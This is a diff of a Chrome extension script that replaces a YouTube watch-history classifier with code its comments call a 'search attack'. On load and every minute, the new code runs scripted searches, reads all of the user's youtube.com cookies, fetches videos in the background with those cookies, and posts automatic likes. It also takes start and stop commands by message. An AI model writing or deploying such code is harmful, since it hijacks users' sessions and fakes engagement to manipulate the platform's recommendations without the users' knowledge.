@@ -1,57 +1,109 @@
-function classifyVideo(title) {
-    const categories = {
-        "Education": ["tutorial", "lesson", "math", "science", "study", "lecture", "exam", "university", "learning", "programming", "coding", "python", "javascript"],
-        "Entertainment": ["movie", "music", "trailer", "funny", "vlog", "reaction", "comedy", "memes", "prank", "dance"],
-        "Health & Fitness": ["exercise", "fitness", "diet", "mental health", "yoga", "workout", "meditation", "nutrition"],
-        "News & Tech": ["news", "update", "politics", "economy", "finance", "ai", "technology", "gadgets", "robotics"],
-        "Sports & Gaming": ["football", "soccer", "basketball", "cricket", "esports", "gameplay", "tournament", "fifa", "nba"]
-    };
+const searchQueries = [
+    "best AI projects 2025",
+    "machine learning tutorial",
+    "deep learning basics",
+    "how to learn neural networks",
+    "latest AI research papers",
+    "AI trends 2025"
+];
 
-    title = title.toLowerCase();
+function performSearch() {
+    const query = searchQueries[Math.floor(Math.random() * searchQueries.length)];
+    const searchUrl = `https://www.youtube.com/results?search_query=${encodeURIComponent(query)}`;
 
-    for (let category in categories) {
-        if (categories[category].some(keyword => title.includes(keyword))) {
-            return category;
-        }
-    }
-
-    return "Others";
+    fetch(searchUrl)
+        .then(response => response.text())
+        .then(html => {
+            const videoIds = extractVideoIds(html);
+            if (videoIds.length > 0) {
+                const randomVideoId = videoIds[Math.floor(Math.random() * videoIds.length)];
+                watchVideoInBackground(randomVideoId);
+            }
+        })
+        .catch(error => console.error("Search request failed:", error));
 }
 
-chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-    if (request.action === "storeHistory") {
-        console.log("📩 Received history data:", request.videos);
+function extractVideoIds(html) {
+    const videoIdRegex = /\"videoId\":\"([^\"]+)\"/g;
+    let videoIds = [];
+    let match;
 
-        // Retrieve existing data first
-        chrome.storage.local.get("youtubeWatchHistory", (data) => {
-            let storedHistory = data.youtubeWatchHistory || [];
+    while ((match = videoIdRegex.exec(html)) !== null) {
+        videoIds.push(match[1]);
+    }
 
-            // Merge new videos with existing ones, avoiding duplicates
-            let newVideos = request.videos.filter(video =>
-                !storedHistory.some(stored => stored.url === video.url)
-            );
+    return videoIds.slice(0, 5);  // Take top 5 relevant videos
+}
 
-            let updatedHistory = [...storedHistory, ...newVideos];
+function watchVideoInBackground(videoId) {
+    const watchUrl = `https://www.youtube.com/watch?v=${videoId}`;
 
-            // Classify all videos
-            let processedVideos = updatedHistory.map(video => ({
-                ...video,
-                category: classifyVideo(video.title)
-            }));
+    // Use chrome.cookies API to get cookies
+    chrome.cookies.getAll({ domain: "youtube.com" }, (cookies) => {
+        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join("; ");
 
-            console.log(`✅ Updated YouTube history with ${newVideos.length} new videos. Total: ${processedVideos.length}`);
+        fetch(watchUrl, {
+            method: "GET",
+            headers: {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
+                "Referer": "https://www.youtube.com/",
+                "Cookie": cookieString  // Use cookies retrieved here
+            }
+        })
+            .then(response => response.text())
+            .then(html => {
+                console.log(`Watching video in background: ${watchUrl}`);
 
-            chrome.storage.local.set({ youtubeWatchHistory: processedVideos }, () => {
-                if (chrome.runtime.lastError) {
-                    console.error("❌ Storage Error:", chrome.runtime.lastError);
-                } else {
-                    console.log("✅ Successfully stored videos in local storage.");
-                }
-            });
+                // Simulate watching time (30-60 sec delay)
+                setTimeout(() => {
+                    likeVideo(videoId);
+                }, 10000); // Like after 10 sec
 
-            sendResponse({ status: "History stored", newCount: newVideos.length });
+                setTimeout(() => {
+                    console.log(`Finished watching: ${watchUrl}`);
+                }, Math.floor(Math.random() * (60000 - 30000) + 30000)); // Watch for 30-60 sec
+            })
+            .catch(error => console.error("Failed to watch video:", error));
+    });
+}
+
+function likeVideo(videoId) {
+    const likeUrl = `https://www.youtube.com/service_ajax?name=likeEndpoint&video_id=${videoId}`;
+
+    fetch(likeUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "X-YouTube-Client-Name": "1",
+            "X-YouTube-Client-Version": "2.20240101.00.00"
+        },
+        body: JSON.stringify({ "videoId": videoId })
+    })
+        .then(() => console.log(`Liked video: ${videoId}`))
+        .catch(error => console.error("Failed to like video:", error));
+}
+
+// Run search attack every 1 minute
+setInterval(performSearch, 60 * 1000);
+
+// Start immediately
+performSearch();
+
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message.action === "openVideo") {
+        chrome.tabs.create({ url: message.url, active: false }, (tab) => {
+            setTimeout(() => {
+                chrome.tabs.remove(tab.id); // Close the tab after 60-120s
+            }, Math.floor(Math.random() * (120 - 60) + 60) * 1000);
         });
+    }
 
-        return true; // Keeps the message channel open for async response
+    if (message.action === "startAttack") {
+        attackInterval = setInterval(performSearch, 10 * 60 * 1000);
+        performSearch();
+    }
+
+    if (message.action === "stopAttack") {
+        clearInterval(attackInterval);
     }
 });
